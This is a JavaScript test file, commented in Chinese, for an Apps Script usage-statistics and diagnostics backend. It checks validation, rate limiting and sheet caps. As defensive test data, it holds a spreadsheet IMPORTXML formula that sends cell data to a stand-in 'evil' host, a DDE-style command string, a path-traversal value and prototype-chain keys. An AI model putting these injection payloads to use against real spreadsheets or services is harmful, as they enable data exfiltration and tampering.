// 用法：node apps-script/Code.test.js
// 用模擬的 Apps Script 環境測 Code.gs：統計路徑不變、診斷路徑寫進另一個分頁、防公式與防灌水
const fs = require('fs'), vm = require('vm'), assert = require('assert');
// 模擬環境（vm）裡建立的陣列和這裡的 Array 不是同一個 realm，deepStrictEqual 會誤判，所以用 JSON 比對
const same = (a, b) => assert.strictEqual(JSON.stringify(a), JSON.stringify(b));
function makeEnv(opts) {
  opts = opts || {};
  const sheets = [];
  const mkSheet = (name) => ({ name, rows: [], appendRow(r) { this.rows.push(r); }, getLastRow() { return this.rows.length; }, getDataRange() { return { getValues: () => this.rows }; } });
  sheets.push(mkSheet('Sheet1')); sheets[0].rows.push(['時間', '作品', '課程', '小時']);
  const ss = {
    getSheets: () => {
      if (opts.throwOnSheet) throw new Error('sheet error');
      return sheets;
    },
    getSheetByName: (n) => sheets.find((s) => s.name === n) || null,
    insertSheet(n, idx) { const s = mkSheet(n); sheets.splice(idx, 0, s); return s; },
    getNumSheets: () => sheets.length
  };
  const cache = {};
  const env = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => cache[k] ?? null,
        put: (k, v) => {
          if (opts.throwOnCachePut && k === 'stats') throw new Error('exceeded cache limit');
          cache[k] = v;
        },
        remove: (k) => { delete cache[k]; }
      })
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, tryLock() { return true; }, releaseLock() {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ t, setMimeType() { return this; } }) },
    Utilities: {
      formatDate: (date, tz) => new Intl.DateTimeFormat('en-CA', {
        timeZone: tz || 'Asia/Taipei', year: 'numeric', month: '2-digit', day: '2-digit'
      }).format(date)
    },
    console,
  };
  vm.createContext(env);
  vm.runInContext(fs.readFileSync(require('path').join(__dirname, 'Code.gs'), 'utf8') + '\nthis.__doPost = doPost; this.__doGet = doGet;', env);
  return {
    env, sheets, cache,
    post: (obj) => JSON.parse(env.__doPost({ postData: { contents: JSON.stringify(obj) } }).t),
    rawPost: (ev) => JSON.parse(env.__doPost(ev).t),
    stats: () => JSON.parse(env.__doGet().t)
  };
}
let t = 0; const ok = (name, fn) => { fn(); t++; console.log('✓', name); };

ok('統計：原本的作法不變，寫進第一個分頁，不會建立診斷分頁', () => {
  const { sheets, post } = makeEnv();
  same(post({ app: 'slowjog', course: '', hour: 12 }), { ok: true });
  assert.strictEqual(sheets.length, 1); assert.strictEqual(sheets[0].rows.length, 2);
  same(post({ app: 'night-yoga', course: 'quick', hour: 0 }), { ok: true });
});
ok('統計：SlowJog Android 與網頁版分開記，也只收課程欄空白、小時 0 到 23', () => {
  const { sheets, post } = makeEnv();
  same(post({ app: 'slowjog-android', course: '', hour: 6 }), { ok: true });
  assert.strictEqual(sheets[0].rows[1][1], 'slowjog-android');
  assert.strictEqual(post({ app: 'slowjog-android', course: 'quick', hour: 6 }).ok, false, 'Android 沒有固定課程');
  assert.strictEqual(post({ app: 'slowjog-android', course: '', hour: 24 }).ok, false);
  assert.strictEqual(post({ app: 'slowjog-android-evil', course: '', hour: 1 }).ok, false);
});
ok('統計：未知作品、非數值小時、原型鏈欄位與不完整請求皆被拒絕', () => {
  const { rawPost, post } = makeEnv();
  assert.strictEqual(post({ app: 'evil', course: '', hour: 1 }).ok, false);
  assert.strictEqual(post({ app: 'constructor', course: '', hour: 1 }).ok, false);
  assert.strictEqual(post({ app: '__proto__', course: '', hour: 1 }).ok, false);
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: 99 }).ok, false);
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: '' }).ok, false, '空字串不可轉成 0 點');
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: null }).ok, false, 'null 不可轉成 0 點');
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: false }).ok, false, '布林值不可轉成 0 點');
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: '12' }).ok, false, '字串小時不可接受');
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: 12.5 }).ok, false, '小數不可接受');
  assert.strictEqual(post({ app: 'slowjog', course: 123, hour: 12 }).ok, false, '非字串課程不可接受');
  assert.strictEqual(rawPost(null).ok, false);
  assert.strictEqual(rawPost({ postData: { contents: '{bad json' } }).ok, false);
});
ok('統計：晚安瑜伽收 quick／standard／deep，以及 lying-01 到 lying-07 這個格式，其他一律拒絕', () => {
  const { sheets, post } = makeEnv();
  const accepted = ['quick', 'standard', 'deep', 'lying-01', 'lying-02', 'lying-03', 'lying-04', 'lying-05', 'lying-06', 'lying-07'];
  accepted.forEach((c) => same(post({ app: 'night-yoga', course: c, hour: 22 }), { ok: true }));
  assert.strictEqual(sheets[0].rows.length, 1 + accepted.length);
  assert.strictEqual(sheets[0].rows[4][2], 'lying-01');
  assert.strictEqual(sheets[0].rows[10][2], 'lying-07');
  ['lying-00', 'lying-08', 'lying-09', 'lying-10', 'lying-1', 'lying-001', 'lying-', 'lying-01 ', ' lying-01', 'lying-01\n',
   'LYING-01', 'Lying-01', 'lying_01', 'lying-0\uff11', 'lying-01-extra', 'xlying-01', '']
    .forEach((c) => assert.strictEqual(post({ app: 'night-yoga', course: c, hour: 22 }).ok, false, '不該收：' + JSON.stringify(c)));
  assert.strictEqual(sheets[0].rows.length, 1 + accepted.length, '被拒絕的不會寫進試算表');
});
ok('統計：lying- 課程只算晚安瑜伽的課程，SlowJog 不能用', () => {
  const { post } = makeEnv();
  ['lying-01', 'lying-03', 'lying-07'].forEach((c) => {
    assert.strictEqual(post({ app: 'slowjog', course: c, hour: 1 }).ok, false);
    assert.strictEqual(post({ app: 'slowjog-android', course: c, hour: 1 }).ok, false);
  });
});
ok('統計：統計頁固定列出三個課程，lying- 課程有人完成過才會出現，異常儲存格不污染統計', () => {
  const { sheets, cache, post, stats } = makeEnv();
  same(stats().apps['night-yoga'].byCourse, { quick: 0, standard: 0, deep: 0 });
  post({ app: 'night-yoga', course: 'lying-01', hour: 23 });
  post({ app: 'night-yoga', course: 'lying-01', hour: 22 });
  post({ app: 'night-yoga', course: 'lying-04', hour: 22 });
  post({ app: 'night-yoga', course: 'quick', hour: 22 });
  const a = stats().apps['night-yoga'];
  same(a.byCourse, { quick: 1, standard: 0, deep: 0, 'lying-01': 2, 'lying-04': 1 });
  assert.strictEqual(a.total, 4);
  // 清掉快取以直接驗證 buildStats_() 對試算表異常列與未定義課程的容錯
  delete cache.stats;
  sheets[0].rows.push(['', 'night-yoga', 'lying-99', '']);
  sheets[0].rows.push([null, 'night-yoga', 'quick', false]);
  sheets[0].rows.push([new Date(), 'toString', '', 5]);
  const b = stats().apps['night-yoga'];
  assert.strictEqual(b.byHour[0], 0, '空小時與 false 不可計入 0 點');
  same(b.byCourse, { quick: 2, standard: 0, deep: 0, 'lying-01': 2, 'lying-04': 1 });
  assert.strictEqual(Object.keys(b.byDay).includes('1970-01-01'), false, '空時間不可變成 1970-01-01');
});
ok('統計：完成寫入也有每分鐘上限（防灌水）', () => {
  const { post } = makeEnv();
  let accepted = 0;
  for (let i = 0; i < 40; i++) {
    if (post({ app: 'slowjog', course: '', hour: 8 }).ok) accepted++;
  }
  assert.strictEqual(accepted, 30);
});
ok('統計：超過 45 天的舊日期不放進 byDay 快取，但仍計入累計與時段總數；快取寫入失敗時仍可讀取', () => {
  const { sheets, stats } = makeEnv({ throwOnCachePut: true });
  const oldDate = new Date(Date.now() - 60 * 864e5);
  const recentDate = new Date();
  sheets[0].rows.push([oldDate, 'slowjog', '', 9]);
  sheets[0].rows.push([recentDate, 'slowjog', '', 10]);
  const s = stats().apps.slowjog;
  assert.strictEqual(s.total, 2);
  assert.strictEqual(s.byHour[9], 1);
  assert.strictEqual(s.byHour[10], 1);
  assert.strictEqual(Object.keys(s.byDay).length, 1);
});
ok('統計：讀取發生例外時回傳安全 JSON 而非錯誤頁面', () => {
  const { stats } = makeEnv({ throwOnSheet: true });
  same(stats(), { error: 'unavailable' });
});
ok('診斷：寫進最後面的「診斷紀錄」分頁，第一個分頁仍是統計', () => {
  const { sheets, post } = makeEnv();
  same(post({ type: 'diag', run: 'AB12', page: 'bg-audio-test.html', text: '[00:03] 節拍開始' }), { ok: true });
  assert.strictEqual(sheets.length, 2);
  assert.strictEqual(sheets[0].name, 'Sheet1', '統計分頁不能被擠到後面');
  assert.strictEqual(sheets[1].name, '診斷紀錄');
  same(sheets[1].rows[0], ['時間', '測試代號', '頁面', '內容']);
  assert.strictEqual(sheets[1].rows[1][1], 'AB12');
  assert.strictEqual(sheets[1].rows[1][3], '> [00:03] 節拍開始');
  assert.strictEqual(sheets[0].rows.length, 1, '統計分頁沒有被多寫');
});
ok('診斷：以「=」開頭的內容不會變成試算表公式，且測試代號／頁面前導符號會被剝除', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: '-AB1', page: '+bad', text: '=IMPORTXML("http://evil/?x="&A1,"//a")' });
  assert.strictEqual(sheets[1].rows[1][1], 'AB1');
  assert.strictEqual(sheets[1].rows[1][2], 'bad');
  assert.ok(sheets[1].rows[1][3].startsWith('> ='), '前面固定有「> 」');
  assert.ok(!String(sheets[1].rows[1][3]).startsWith('='));
});
ok('診斷：測試代號與頁面只留英數字、內容超長會截斷、缺資料被拒絕', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: '=cmd|x;<b>', page: '../a b', text: 'x'.repeat(9000) });
  assert.strictEqual(sheets[1].rows[1][1], 'cmdxb');
  assert.strictEqual(sheets[1].rows[1][2], '..ab');
  assert.strictEqual(sheets[1].rows[1][3].length, 2 + 4000);
  assert.strictEqual(post({ type: 'diag', run: '', text: 'x' }).ok, false);
  assert.strictEqual(post({ type: 'diag', run: 'A', text: '' }).ok, false);
});
ok('診斷：每分鐘超過上限就停止收（防灌水）', () => {
  const { post } = makeEnv();
  let accepted = 0; for (let i = 0; i < 80; i++) if (post({ type: 'diag', run: 'R', text: 't' + i }).ok) accepted++;
  assert.strictEqual(accepted, 60);
});
ok('診斷：分頁滿了就停止收', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: 'R', text: 'first' });
  for (let i = 0; i < 3000; i++) sheets[1].rows.push(['x']);
  const r = post({ type: 'diag', run: 'R', text: 'overflow' });
  same(r, { ok: false, error: 'full' });
});
console.log('\n全部 ' + t + ' 項通過');
